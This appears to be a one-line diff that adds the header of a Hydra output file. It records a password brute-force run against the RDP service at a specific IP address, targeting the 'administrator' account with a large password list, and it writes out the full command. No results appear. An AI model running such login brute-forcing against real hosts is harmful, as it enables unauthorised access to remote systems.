@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 06:40:58 on 103.24.230.93 rdp (hydra -l administrator -P /tmp/pass_big.txt -t 1 -w 5 -o /tmp/bigrdp.txt rdp://103.24.230.93)
